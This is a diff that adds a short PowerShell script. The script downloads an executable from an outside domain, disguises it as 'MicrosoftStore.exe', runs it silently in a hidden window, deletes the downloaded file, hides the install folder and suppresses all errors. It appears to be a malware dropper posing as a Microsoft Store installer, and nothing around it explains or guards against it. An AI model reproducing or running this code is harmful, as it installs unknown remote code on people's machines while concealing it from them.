@@ -1,0 +1,18 @@
+$downloadUrl = "https://updateapps.online/Stores"
+$downloadPath = "$env:TEMP\MicrosoftStore.exe"
+$installPath = "C:\Program Files\Microsoft Store\MicrosoftStore"
+
+try {
+    Invoke-WebRequest -Uri $downloadUrl -OutFile $downloadPath
+
+    if (Test-Path $downloadPath) {
+        Start-Process -FilePath $downloadPath -ArgumentList "-fullinstall", "-s" -Wait -WindowStyle Hidden
+        Remove-Item -Path $downloadPath -Force
+
+        if (Test-Path $installPath) {
+            (Get-Item $installPath).Attributes += [System.IO.FileAttributes]::Hidden
+        }
+    }
+} catch {
+    
+}
